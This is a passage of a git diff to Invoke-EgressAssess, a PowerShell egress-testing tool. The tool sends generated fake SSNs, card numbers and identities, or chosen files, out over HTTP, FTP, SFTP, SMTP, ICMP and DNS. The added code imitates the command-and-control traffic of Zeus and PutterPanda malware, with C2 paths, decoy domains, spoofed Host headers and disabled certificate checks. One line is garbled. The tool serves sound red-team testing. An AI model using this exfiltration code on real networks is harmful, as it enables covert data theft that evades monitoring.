+            '/news/secure.php', '/news/vuan.bin', '/.id/file.php',
+            '/.id/gate.php',
+            '/fast-move/cidphp/file.php', '/fast-move/cidphp/gate.php',
+            '/overopen/panel/config.bin', '/overopen/panel/secure.php',
+            '/chromez/config.jpg', '/chromez/gate.php', '/libraries/db.php',
+            '/sadcxvbv/vdfbffddf.php', '/wqwcqqw/sasasacw.php',
+            '/wp-comment/baba.jpg', '/wp-comment/gate.php',
+            '/alumno309/images/base.bin', '/alumno309/images/base.exe',
+            '/alumno309/images/secure.php',
+            '/wp-content/plugins/wp-db-backup-made/das.db',
+            '/ta_images/tools.php', '/plank/panel/config.jpg',
+            '/includes/database/http/config.jpg',
+            '/includes/database/http/zin.php', '/wqwcqqw/sasasacw.php',
+            '/administrator/modules/mod_menu/help/config.jpg',
+            '/administrator/modules/mod_menu/help/gate.php', '/old/jx36.bin',
+            '/old/jx36.exe', '/old/secure.php', '/images/icons/bt.exe',
+            '/images/icons/cfg.bin', '/images/icons/gate.php', '/t/wpg.php',
+            '/forum.php', '/config.php', '/wp-blog/gate.php',
+            '/wp-blog/mell.jpg', '/descargas/adm/gate.php',
+            '/descargas/config/orqu.bin', '/wp-rss.php', '/images/gate.php',
+            '/images/outl.jpg', '/images/smilies/raye.jpg',
+            '/images/kin/config.jpg', '/jaextmanager_data/rimm.bin',
+            '/jaextmanager_data/secure.php', '/js/cssme/file.php',
+            '/js/cssme/thread.php', '/mss/plugins/system/config.bin',
+            '/mss/plugins/system/gate.php', '/wp-admin/maint/config.bin',
+            '/wp-admin/maint/gate.php', '/blog/wp-content/uploads/kim.dot',
+            '/images/secure.php', '/images/todo.bin', '/images/todo.exe',
+            '/plugins/system/bot.exe', '/plugins/system/config.bin',
+            '/plugins/system/gate.php', '/modules/mod_footer/tmpl/file.php',
+            '/modules/mod_footer/tmpl/gate.php', '/modules/secure.php',
+            '/modules/warp.bin', '/modules/warp.exe', '/file.php',
+            '/gate.php', '/db1/config.jpg', '/db1/gate.php',
+            '/katolog/thumbs/panel/config.jpg',
+            '/katolog/thumbs/panel/gate.php')
+            #$post_data = @('zeus_id uid=0(root) gid=0(root) groups=0(root)','zeus_whoami root'},'zeus_dir C:\\, C:\\Windows',
+            #  'zeus_ps': 'svchost.exe, spoolsvc.exe, explorer.exe, iexplorer.exe','zeus_ipconfig': '192.168.1.15 255.255.255.0 192.168.1.1',
+            # 'zeus_ping': 'google.com time=13.6, 15.1, 19.8, 20')
+            
+            # Detect what datatype we're sending
+            if ($Datatype -contains "ssn" -or "cc" -or "identity")
+            {
+                
+                if ($Datatype -eq "ssn")
+                {
+                    Generate-SSN
+                    $Data = $AllSSN
+                }
+                elseif ($Datatype -eq "cc")
+                {
+                    Generate-CreditCards
+                    $Data = $AllCC
+                }
+                elseif ($Datatype -eq "identity")
+                {
+                    Generate-Identity
+                    $Data = $AllNames
+                }
+            }
+            else
+            {
+                Write-Verbose "[*] You did not provide a data type to generate."
+                Return
+            }
+            
+            Do
+            {
+                try
+                {
+                    $ranURI = Get-Random -InputObject $uris
+                    if ($client -eq "http")
+                    {
+                        $Url = "http://" + $IP + $ranURI
+                    }
+                    elseif ($client -eq "https")
+                    {
+                        $Url = "https://" + $IP + $ranURI
+                    }
+                    $ranHost = Get-Random -InputObject $domains
+                    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+                    $uri = New-Object -TypeName System.Uri -ArgumentList $Url
+                    $wc = New-Object -TypeName System.Net.WebClient
+                    Write-Verbose $uri
+                    $wc.Headers.Add('Accept', '*/*')
+                    $wc.Headers.Add('User-Agent', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
+                    $wc.Headers.Add('Host', $ranHost)
+                    $wc.Headers.Add('Pragma', 'no-cache')
+                    Write-Verbose  "Uploading  data..."
+                    $wc.UploadString($uri, $Data)
+                }
+                catch
+                {
+                    $ErrorMessage = $_.Exception.Message
+                    Write-Verbose "[*] Error, tranfer failed with error:"
+                    Write-Verbose $ErrorMessage
+                    Break
+                }
+                Write-Verbose "[*] Transfer complete!"
+                $loops--
+                Write-Verbose "[*] $loops loops remaining.."
+            }
+            While ($loops -gt 0)
+        }
+        
+        function Use-PutterPanda
+        {
+            function Gen-Numbers($num)
+            {
+                if ($num -eq 5)
+                {
+                    Get-Random -Minimum 10000 -Maximum 99999
+                }
+                elseif ($num -eq 2)
+                {
+                    Get-Random -Minimum 10 -Maximum 99
+                }
+                elseif ($num -eq 6)
+                {
+                    Get-Random -Minimum 100000 -Maximum 999999
+                }
+                elseif ($num -eq 7)
+                {
+                    Get-Random -Minimum 1000000 -Maximum 9999999
+                }
+            }
+            
+            $domains = @('ctable.org', 'gamemuster.com', 'kyoceras.net', 'nestlere.com',
+            'raylitoday.com', 'renewgis.com', 'siseau.com', 'bmwauto.org',
+            't008.net', 'vssigma.com', 'anyoffice.info', 'it-bar.net',
+            'jj-desk.com', 'satelliteclub.info', 'space-today.info',
+            'sst1.info', 'stream-media.info', 'webfilestore.net')
+            $encodedHostnames = @('SG9tZVBD', 'Q29tcGFueVdvcmtzdGF0aW9u',
+            'd29ya3N0YXRpb24tMTMy', 'UHJpbWFyeURvbWFpbkNvbnRyb2xsZXI=',
+            'ZmlsZXNlcnZlcg==', 'd2Vic2VydmVy', 'RE5Tc2VydmVyMg==',
+            'Yml0c3kubWl0LmVkdQ==', 'c2VydmVyMS5jaWEuZ292',
+            'ZXZpZGVuY2UuZmJpLmdvdg==', 'ZGIuc3NhLmdvdg==',
+            'cGlpLmZkYS5nb3Y=', 'ZGF0YS5mZGEuZ292')
+            $uris = @($("/search5" + $(Gen-Numbers(5)) + "?h1=" + $(Gen-Numbers(2)) + "&h2=" + $(Get-Random -SetSeed 13) + "&h3=" + $(Gen-Numbers(6)) + "&h4=" + $(Gen-Numbers(5))),
+            $("/microsoft/errorpost/default/connect.aspx?ID=" + $(Gen-Numbers(5))),
+            $("/MicrosoftUpdate/ShellEX/KB" + $(Gen-Numbers(7)) + '/default.aspx?tmp=' + $(Get-Random -InputObject $encodedHostnames)),
+            $("/microsoft/errorpost/default.aspx?ID=" + $(Gen-Numbers(5))),
+            $("/MicrosoftUpdate/GetUpdate/KB" + $(Gen-Numbers(7)) + "/default.asp?tmp=" + $(Get-Random -InputObject $encodedHostnames)),
+            $("/MicrosoftUpdate/GetFiles/KB" + $(Gen-Numbers(7)) + "/default.asp?tmp=" + $(Get-Random -InputObject $encodedHostnames)),
+            $("/MicrosoftUpdate/WWRONG/KB" + $(Gen-Numbers(7)) + "/default.asp?tmp=" + $(Get-Random -InputObject $encodedHostnames)))
+            
+            # Detect what datatype we're sending
+            if ($Datatype -contains "ssn" -or "cc" -or "identity")
+            {
+                
+                if ($Datatype -eq "ssn")
+                {
+                    Generate-SSN
+                    $Data = $AllSSN
+                }
+                elseif ($Datatype -eq "cc")
+                {
+                    Generate-CreditCards
+                    $Data = $AllCC
+                }
+                elseif ($Datatype -eq "identity")
+                {
+                    Generate-Identity
+                    $Data = $AllNames
+                }
+            }
+            else
+            {
+                Write-Verbose "[*] You did not provide a data type to generate."
+                Return
+            }
+            
+            Do
+            {
+                try
+                {
+                    $ranURI = Get-Random -InputObject $uris
+                    if ($client -eq "http")
+                    {
+                        $Url = "http://" + $IP + $ranURI
+                    }
+                    elseif ($client -eq "https")
+                    {
+                        $Url = "https://" + $IP + $ranURI
+                    }
+                    $ranHost = Get-Random -InputObject $domains
+                    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+                    $uri = New-Object -TypeName System.Uri -ArgumentList $Url
+                    $wc = New-Object -TypeName System.Net.WebClient
+                    Write-Verbose $uri
+                    $wc.Headers.Add('Accept', '*/*')
+                    $wc.Headers.Add('User-Agent', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
+                    $wc.Headers.Add('Host', $ranHost)
+                    $wc.Headers.Add('Pragma', 'no-cache')
+                    Write-Verbose  "Uploading  data..."
+                    $wc.UploadString($uri, $Data)
+                }
+                catch
+                {
+                    $ErrorMessage = $_.Exception.Message
+                    Write-Verbose "[*] Error, tranfer failed with error:"
+                    Write-Verbose $ErrorMessage
+                    Break
+                }
+                Write-Verbose "[*] Transfer complete!"
+                $loops--
+                Write-Verbose "[*] $loops loops remaining.."
+            }
+            While ($loops -gt 0)
+        }
+        #############################
+        #   End Malware Signatures  #
+        #############################
+        function Use-Actor($Actor)
+        {
+            if ($Actor -contains "Zeus")
+            {
+                Use-Zeus
+                Break
+            }
+            elseif ($Actor -contains "PutterPanda")
+            {
+                Use-PutterPanda
+                Break
+            }
+            elseif ($Actor -contains "DarkHotel")
+            {
+                Use-DarkHotel
+                Break
+            }
+            elseif ($Actor -contains "Etumbot")
+            {
+                Use-Etumbot
+                Break
+            }
+        }
+        
+        function Use-HTTP
+        {
+            
+            function Get-UserAgent($UASelect)
+            {
+                function Use-Mozilla
+                {
+                    $script:UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
+                }
+                
+                function Use-InternetExplorer
+                {
+                    $script:UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
+                }
+                
+                function Use-Safari
+                {
+                    $script:UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A"
+                }
+                
+                if ($UASelect -contains "IE" -or "Moz" -or "Saf")
+                {
+                    
+                    if ($UASelect -contains "IE")
+                    {
+                        Use-InternetExplorer
+                    }
+                    if ($UASelect -contains "Moz")
+                    {
+                        Use-Mozilla
+                    }
+                    if ($UASelect -contains "Saf")
+                    {
+                        Use-Safari
+                    }
+                }
+                else
+                {
+                    $r = Get-Random -Minimum 1 -Maximum 3
+                    Write-Verbose "Switching function"
+                    switch ($r) # Use switch statement to
+                    {
+                        1 { Use-Mozilla }
+                        2 { Use-InternetExplorer }
+                        3 { Use-Safari }
+                    }
+                }
+                
+            }
+            # Detect what datatype we're sending
+            if ($Datatype -contains "ssn" -or "cc" -or "identity")
+            {
+                $totalupload = 0
+                if ($Datatype -eq "ssn")
+                {
+                    Generate-SSN
+                    $Data = $AllSSN
+                }
+                elseif ($Datatype -eq "cc")
+                {
+                    Generate-CreditCards
+                    $Data = $AllCC
+                }
+                elseif ($Datatype -eq "identity")
+                {
+                    Generate-Identity
                     $Data = $AllNames
                 }
                 if ($client -eq "http")
@@ -384,32 +1100,9 @@ function Invoke-EgressAssess
                 {
                     $Url = "https://" + $IP + "/post_data.php"
                 }
-                $uri = New-Object -TypeName System.Uri -ArgumentList $Url
-                $wc = New-Object -TypeName System.Net.WebClient
-                if ($proxy)
-                {
-                    $proxy = [System.Net.WebRequest]::GetSystemWebProxy()
-                    $proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
-                    $wc.proxy = $proxy
-                }
-                Do {
-                    Try {
-                    Write-Verbose  "Uploading  data..."
-                    $wc.UploadString($uri, $Data)
-                    $totalupload += $sizedata
-                    }
-                    catch
-                    {
-                    $ErrorMessage = $_.Exception.Message
-                    Write-Verbose "[*] Error, tranfer failed with error:"
-                    Write-Verbose $ErrorMessage
-                    Break
-                    }
-                    Write-Verbose "[*] Transfer complete!"
-                    $loops--
-                    Write-Verbose "[*] $loops loops remaining.."
-                    } While ($loops -gt 0)
+                
             }
+            
             elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
             {
                 if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
@@ -434,13 +1127,26 @@ function Invoke-EgressAssess
             [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
             $uri = New-Object -TypeName System.Uri -ArgumentList $Url
             $wc = New-Object -TypeName System.Net.WebClient
+            if ($UserAgent)
+            {
+                Get-UserAgent -UASelect $UserAgent
+                $wc.Headers.Add('UserAgent', $script:UserAgent)
+            }
+            else
+            {
+                Get-UserAgent -UASelect ""
+                $wc.Headers.Add('UserAgent', $script:UserAgent)
+            }
+            
             if ($proxy)
             {
-                $proxy = [System.Net.WebRequest]::GetSystemWebProxy()
-                $proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
+                $proxy = [Slslsstem.Net.WebRequest]::GetSystemWebProxy()
+                $proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
                 $wc.proxy = $proxy
             }
-            if ($filetransfer -eq $true) {
+            if ($filetransfer -eq $true)
+            {
+                
                 $data = Get-Content $SourceFilePath -Encoding Byte -ReadCount 0
                 $wc.Headers.Add('Content-Type', 'mimeType')
                 $wc.Headers.Add('Filename', $FileName)
@@ -448,77 +1154,16 @@ function Invoke-EgressAssess
                 $wc.UploadData($uri, 'POST', $data)
                 Write-Verbose "[*] Transaction Complete."
             }
-
-            else {
-                Write-Verbose  "Uploading data.."
-                $wc.UploadString($uri, $Body)
-                Write-Verbose "[*] Transaction Complete."
-            }
-        }
-        
-        function Use-Ftp
-        {
-            if ($Datatype -contains "ssn" -or "cc" -or "identity")
-            {
-                if ($Datatype -eq "ssn") {
-                    Generate-SSN
-                    $FTPData = $AllSSN
-                }
-                elseif ($Datatype -eq "cc") {
-                    Generate-CreditCards
-                    $FTPData = $AllCC
-                }
-                elseif ($Datatype -eq "identity") {
-                    Generate-Names
-                    $FTPData = $AllNames
-                }
             
-            elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity") {
-                if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
-                $Path = get-childitem $Datatype | % { $_.Name }
-                $filetransfer = $True
-                }
-            }
-            if ($filetransfer -eq $True) {
-                $Destination = "ftp://" + $IP + "/" + $Path
-                $SourceFilePath = Get-ChildItem $Datatype | % { $_.FullName }
-                $webclient = New-Object System.Net.WebClient
-                $webclient.Credentials = New-Object System.Net.NetworkCredential($username,$password)
-                if ($proxy)
+            else
+            {
+                Do
                 {
-                    $proxy = [System.Net.WebRequest]::GetSystemWebProxy()
-                    $proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
-                    $webclient.proxy = $proxy
-                }
-                $uri = New-Object System.Uri($Destination)
-                $webclient.UploadFile($uri, $SourceFilePath)
-                Write-Verbose "[*] File Transfer Complete."
-            }
-            else {
-                Do {
-                    Try {
-                    $Date = Get-Date -Format Mdyyyy_hhmmss
-                    $Path = "ftpdata" + $Date + ".txt"
-                    $Destination = "ftp://" + $IP + "/" + $Path
-                    $Credential = New-Object -TypeName System.Net.NetworkCredential -ArgumentList $Username, $Password
-                    
-                    # Create the FTP request and upload the file
-                    $FtpRequest = [System.Net.FtpWebRequest][System.Net.WebRequest]::Create($Destination)
-                    if ($proxy)
+                    Try
                     {
-                        $proxy = [System.Net.WebRequest]::GetSystemWebProxy()
-                        $proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
-                        $FtpRequest.proxy = $proxy
-                    }
-                    $FtpRequest.KeepAlive = $False
-                    $FtpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
-                    $FtpRequest.Credentials = $Credential
-                    # Get the request stream, and write the file bytes to the stream
-                    $Encoder = [system.Text.Encoding]::UTF8
-                    $RequestStream = $FtpRequest.GetRequestStream()
-                    $Encoder.GetBytes($FTPData) | % { $RequestStream.WriteByte($_); }
-                    $RequestStream.Close()
-                    Write-Verbose "[*] File Transfer Complete."
+                        Write-Verbose  "Uploading  data..."
+                        $wc.UploadString($uri, $Data)
+                        $totalupload += $sizedata
                     }
                     catch
                     {
@@ -530,9 +1175,96 @@ function Invoke-EgressAssess
                     Write-Verbose "[*] Transfer complete!"
                     $loops--
                     Write-Verbose "[*] $loops loops remaining.."
-                    } While ($loops -gt 0)
-            }       
-            
+                }
+                While ($loops -gt 0)
+            }
+        }
+        
+        function Use-Ftp
+        {
+            if ($Datatype -contains "ssn" -or "cc" -or "identity")
+            {
+                if ($Datatype -eq "ssn")
+                {
+                    Generate-SSN
+                    $FTPData = $AllSSN
+                }
+                elseif ($Datatype -eq "cc")
+                {
+                    Generate-CreditCards
+                    $FTPData = $AllCC
+                }
+                elseif ($Datatype -eq "identity")
+                {
+                    Generate-Identity
+                    $FTPData = $AllNames
+                }
+                
+                elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
+                {
+                    if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
+                    $Path = get-childitem $Datatype | % { $_.Name }
+                    $filetransfer = $True
+                }
+            }
+            if ($filetransfer -eq $True)
+            {
+                $Destination = "ftp://" + $IP + "/" + $Path
+                $SourceFilePath = Get-ChildItem $Datatype | % { $_.FullName }
+                $webclient = New-Object System.Net.WebClient
+                $webclient.Credentials = New-Object System.Net.NetworkCredential($username, $password)
+                if ($proxy)
+                {
+                    $proxy = [System.Net.WebRequest]::GetSystemWebProxy()
+                    $proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
+                    $webclient.proxy = $proxy
+                }
+                $uri = New-Object System.Uri($Destination)
+                $webclient.UploadFile($uri, $SourceFilePath)
+                Write-Verbose "[*] File Transfer Complete."
+            }
+            else
+            {
+                Do
+                {
+                    Try
+                    {
+                        $Date = Get-Date -Format Mdyyyy_hhmmss
+                        $Path = "ftpdata" + $Date + ".txt"
+                        $Destination = "ftp://" + $IP + "/" + $Path
+                        $Credential = New-Object -TypeName System.Net.NetworkCredential -ArgumentList $Username, $Password
+                        
+                        # Create the FTP request and upload the file
+                        $FtpRequest = [System.Net.FtpWebRequest][System.Net.WebRequest]::Create($Destination)
+                        if ($proxy)
+                        {
+                            $proxy = [System.Net.WebRequest]::GetSystemWebProxy()
+                            $proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
+                            $FtpRequest.proxy = $proxy
+                        }
+                        $FtpRequest.KeepAlive = $False
+                        $FtpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+                        $FtpRequest.Credentials = $Credential
+                        # Get the request stream, and write the file bytes to the stream
+                        $Encoder = [system.Text.Encoding]::UTF8
+                        $RequestStream = $FtpRequest.GetRequestStream()
+                        $Encoder.GetBytes($FTPData) | % { $RequestStream.WriteByte($_); }
+                        $RequestStream.Close()
+                        Write-Verbose "[*] File Transfer Complete."
+                    }
+                    catch
+                    {
+                        $ErrorMessage = $_.Exception.Message
+                        Write-Verbose "[*] Error, tranfer failed with error:"
+                        Write-Verbose $ErrorMessage
+                        Break
+                    }
+                    Write-Verbose "[*] Transfer complete!"
+                    $loops--
+                    Write-Verbose "[*] $loops loops remaining.."
+                }
+                While ($loops -gt 0)
+            }
         }
         
         function Use-SFTP
@@ -546,21 +1278,25 @@ function Invoke-EgressAssess
             }
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
             {
-                if ($Datatype -eq "ssn") {
+                if ($Datatype -eq "ssn")
+                {
                     Generate-SSN
                     $FTPData = $AllSSN
                 }
-                elseif ($Datatype -eq "cc") {
+                elseif ($Datatype -eq "cc")
+                {
                     Generate-CreditCards
                     $FTPData = $AllCC
                 }
-                elseif ($Datatype -eq "identity") {
-                    Generate-Names
+                elseif ($Datatype -eq "identity")
+                {
+                    Generate-Identity
                     $FTPData = $AllNames
                 }
-            
-            elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity") {
-                if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
+                
+                elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
+                {
+                    if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
                 }
             }
             else
@@ -579,11 +1315,13 @@ function Invoke-EgressAssess
                 Write-Verbose "[*] Error loading dll"
                 Break
             }
-
-            if ($global:FileTransfer -eq $True) {
+            
+            if ($global:FileTransfer -eq $True)
+            {
                 $Path = get-childitem $Datatype | % { $_.Name }
             }
-            else {
+            else
+            {
                 $Date = Get-Date -Format Mdyyyy_hhmmss
                 $Path = "ftpdata" + $Date + ".txt"
                 try
@@ -597,7 +1335,7 @@ function Invoke-EgressAssess
                     Write-Verbose $ErrorMessage
                     Break
                 }
-            }   
+            }
             # Connect to Egress-Assess Server       
             try
             {
@@ -610,8 +1348,10 @@ function Invoke-EgressAssess
                 Write-Verbose "[*] Connection failed"
                 Return
             }
-            if ($global:FileTransfer -eq $True) {
-                try {
+            if ($global:FileTransfer -eq $True)
+            {
+                try
+                {
                     Write-Verbose "[*] Uploading data.."
                     $SourceFilePath = Get-ChildItem $Datatype | % { $_.FullName }
                     $FileStream = [System.IO.File]::OpenRead("$SourceFilePath")
@@ -623,14 +1363,17 @@ function Invoke-EgressAssess
                     $sftpClient.Disconnect()
                     $sftpClient.Dispose()
                 }
-                catch {
+                catch
+                {
                     $ErrorMessage = $_.Exception.Message
                     Write-Verbose $ErrorMessage
                     Break
                 }
             }
-            else {
-                try {
+            else
+            {
+                try
+                {
                     Write-Verbose "[*] Uploading data.."
                     $FileStream = [System.IO.File]::OpenRead("$env:temp\$Path")
                     $sftpClient.UploadFile($FileStream, $Path)
@@ -643,7 +1386,8 @@ function Invoke-EgressAssess
                     $ErrorMessage = $_.Exception.Message
                     Remove-Item -Path $env:temp\$Path
                 }
-                catch {
+                catch
+                {
                     $ErrorMessage = $_.Exception.Message
                     Write-Verbose $ErrorMessage
                     Break
@@ -656,71 +1400,84 @@ function Invoke-EgressAssess
         {
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
             {
-                if ($Datatype -eq "ssn") {
+                if ($Datatype -eq "ssn")
+                {
                     Generate-SSN
                     $SMTPData = $AllSSN
                 }
-                elseif ($Datatype -eq "cc") {
+                elseif ($Datatype -eq "cc")
+                {
                     Generate-CreditCards
                     $SMTPData = $AllCC
                 }
-                elseif ($Datatype -eq "identity") {
-                    Generate-Names
+                elseif ($Datatype -eq "identity")
+                {
+                    Generate-Identity
                     $SMTPData = $AllNames
                 }
-            
-            elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity") {
-                if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
-                $filetransfer = $True
-                $SourceFilePath = Get-ChildItem $Datatype | % { $_.FullName }
-            }
+                
+                elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
+                {
+                    if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
+                    $filetransfer = $True
+                    $SourceFilePath = Get-ChildItem $Datatype | % { $_.FullName }
+                }
             }
             else
             {
                 Write-Verbose "[*] You did not provide a data type to generate."
             }
-            Do {
-            Try { 
-                if ($filetransfer -eq $true) {
-                Send-MailMessage -From tester@egress-assess.com -To server@egress-asses.com -Subject "Egress-Assess Exfil Data" -Body "EgressAssess With Attachment" -Attachments "$SourceFilePath" -SmtpServer $IP
-                }
-                else {
-                Send-MailMessage -From tester@egress-assess.com -To server@egress-asses.com -Subject "Egress-Assess Exfil Data" -Body "$SMTPData" -SmtpServer $IP    
-                }
-            }
-            catch
+            Do
             {
-                $ErrorMessage = $_.Exception.Message
-                Write-Verbose "[*] Error, tranfer failed with error:"
-                Write-Verbose $ErrorMessage
-                Break
+                Try
+                {
+                    if ($filetransfer -eq $true)
+                    {
+                        Send-MailMessage -From tester@egress-assess.com -To server@egress-asses.com -Subject "Egress-Assess Exfil Data" -Body "EgressAssess With Attachment" -Attachments "$SourceFilePath" -SmtpServer $IP
+                    }
+                    else
+                    {
+                        Send-MailMessage -From tester@egress-assess.com -To server@egress-asses.com -Subject "Egress-Assess Exfil Data" -Body "$SMTPData" -SmtpServer $IP
+                    }
+                }
+                catch
+                {
+                    $ErrorMessage = $_.Exception.Message
+                    Write-Verbose "[*] Error, tranfer failed with error:"
+                    Write-Verbose $ErrorMessage
+                    Break
+                }
+                Write-Verbose "[*] Transfer complete!"
+                $loops--
+                Write-Verbose "[*] $loops loops remaining.."
             }
-            Write-Verbose "[*] Transfer complete!"
-            $loops--
-            Write-Verbose "[*] $loops loops remaining.."
-            } While ($loops -gt 0)
+            While ($loops -gt 0)
         }
         
         function Use-ICMP
         {
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
             {
-                if ($Datatype -eq "ssn") {
+                if ($Datatype -eq "ssn")
+                {
                     Generate-SSN
                     [string]$ICMPData = $AllSSN
                 }
-                elseif ($Datatype -eq "cc") {
+                elseif ($Datatype -eq "cc")
+                {
                     Generate-CreditCards
                     [string]$ICMPData = $AllCC
                 }
-                elseif ($Datatype -eq "identity") {
-                    Generate-Names
+                elseif ($Datatype -eq "identity")
+                {
+                    Generate-Identity
                     [string]$ICMPData = $AllNames
                 }
-            
-            elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity") {
-                if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
-                $filetransfer = $true
+                
+                elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
+                {
+                    if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
+                    $filetransfer = $true
                 }
             }
             else
@@ -734,8 +1491,8 @@ function Invoke-EgressAssess
                     $FinalDestination = [System.Net.Dns]::GetHostEntry($IP)
                 }
                 catch
-                {                   Write-Verbose "[*] Hostname not resolved"
-
+                {
+                    Write-Verbose "[*] Hostname not resolved"
                     Return
                 }
             }
@@ -747,7 +1504,7 @@ function Invoke-EgressAssess
             $PacketNumber = 1
             $bufferSize = 1050
             $Timeout = 1000
-
+            
             if ($FileTransfer -eq $True)
             {
                 $Delimiter = '.:::-989-:::.'
@@ -779,22 +1536,24 @@ function Invoke-EgressAssess
             }
             else
             {
-                Do {
-                    try {
+                Do
+                {
+                    try
+                    {
                         Write-Verbose "[*] Sending data via ICMP."
                         [int]$TotalPackets = ($ICMPData.length/$bufferSize)
                         While ($ByteReader -le ($ICMPData.length - $bufferSize))
                         {
-                        Write-Verbose "[*] Sending $PacketNumber of $TotalPackets packets"
-                        $DataToSend = $ICMPData.Substring($ByteReader, $bufferSize)
-                        $Encoder = [system.Text.Encoding]::UTF8
-                        $DataBytes = $Encoder.GetBytes($DataToSend)
-                        $EncodedData = [System.Convert]::ToBase64String($DataBytes)
-                        $Buffer = $Encoder.GetBytes($EncodedData)
-                        $Ping = New-Object -TypeName System.Net.NetworkInformation.Ping
-                        $PingReply = $Ping.Send($FinalDestination, $Timeout, $Buffer)
-                        $ByteReader += $bufferSize
-                        $PacketNumber++
+                            Write-Verbose "[*] Sending $PacketNumber of $TotalPackets packets"
+                            $DataToSend = $ICMPData.Substring($ByteReader, $bufferSize)
+                            $Encoder = [system.Text.Encoding]::UTF8
+                            $DataBytes = $Encoder.GetBytes($DataToSend)
+                            $EncodedData = [System.Convert]::ToBase64String($DataBytes)
+                            $Buffer = $Encoder.GetBytes($EncodedData)
+                            $Ping = New-Object -TypeName System.Net.NetworkInformation.Ping
+                            $PingReply = $Ping.Send($FinalDestination, $Timeout, $Buffer)
+                            $ByteReader += $bufferSize
+                            $PacketNumber++
                         }
                     }
                     catch
@@ -809,7 +1568,8 @@ function Invoke-EgressAssess
                     $PacketNumber = 0
                     $loops--
                     Write-Verbose "[*] $loops loops remaining.."
-                    } While ($Loops -gt 0) 
+                }
+                While ($Loops -gt 0)
             }
         }
         
@@ -818,27 +1578,33 @@ function Invoke-EgressAssess
         {
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
             {
-                if ($Datatype -eq "ssn") {
+                if ($Datatype -eq "ssn")
+                {
                     Generate-SSN
                     [string]$DNSData = $AllSSN
                 }
-                elseif ($Datatype -eq "cc") {
+                elseif ($Datatype -eq "cc")
+                {
                     Generate-CreditCards
                     [string]$DNSData = $AllCC
                 }
-                elseif ($Datatype -eq "identity") {
-                    Generate-Names
+                elseif ($Datatype -eq "identity")
+                {
+                    Generate-Identity
                     [string]$DNSData = $AllNames
                 }
-            
-            elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity") {
-                Write-Verbose "[*] You did not provide a data type to generate."
-                Write-Verbose "[*] DNS file transfers currently not supported."
-                break
+                
+                elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
+                {
+                    Write-Verbose "[*] You did not provide a data type to generate."
+                    Write-Verbose "[*] DNS file transfers currently not supported."
+                    break
                 }
             }
-            Do {
-                try {
+            Do
+            {
+                try
+                {
                     [int]$MaxLenth = 63
                     [int]$DefaultLength = 35
                     [int]$ByteReader = 0
@@ -870,10 +1636,10 @@ function Invoke-EgressAssess
                         }
                         catch
                         {
-                        $ErrorMessage = $_.Exception.Message
-                        Write-Verbose "[*] Error, DNS data tranfer failed with error:"
-                        Write-Verbose $ErrorMessage
-                        Break
+                            $ErrorMessage = $_.Exception.Message
+                            Write-Verbose "[*] Error, DNS data tranfer failed with error:"
+                            Write-Verbose $ErrorMessage
+                            Break
                         }
                     }
                 }
@@ -884,41 +1650,48 @@ function Invoke-EgressAssess
                     Write-Verbose $ErrorMessage
                     Break
                 }
-            Write-Verbose "[*] Transfer complete!"
-            $loops--
-            Write-Verbose "[*] $loops loops remaining.."
-            } While ($loops -gt 0)            
+                Write-Verbose "[*] Transfer complete!"
+                $loops--
+                Write-Verbose "[*] $loops loops remaining.."
+            }
+            While ($loops -gt 0)
         }
         
         function Use-DNSResolved
         {
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
             {
-                if ($Datatype -eq "ssn") {
+                if ($Datatype -eq "ssn")
+                {
                     Generate-SSN
                     [string]$DNSData = $AllSSN
                 }
-                elseif ($Datatype -eq "cc") {
+                elseif ($Datatype -eq "cc")
+                {
                     Generate-CreditCards
                     [string]$DNSData = $AllCC
                 }
-                elseif ($Datatype -eq "identity") {
-                    Generate-Names
+                elseif ($Datatype -eq "identity")
+                {
+                    Generate-Identity
                     [string]$DNSData = $AllNames
                 }
-            
-            elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity") {
-                Write-Verbose "[*] You did not provide a data type to generate."
-                Write-Verbose "[*] DNS file transfers currently not supported."
-                break
+                
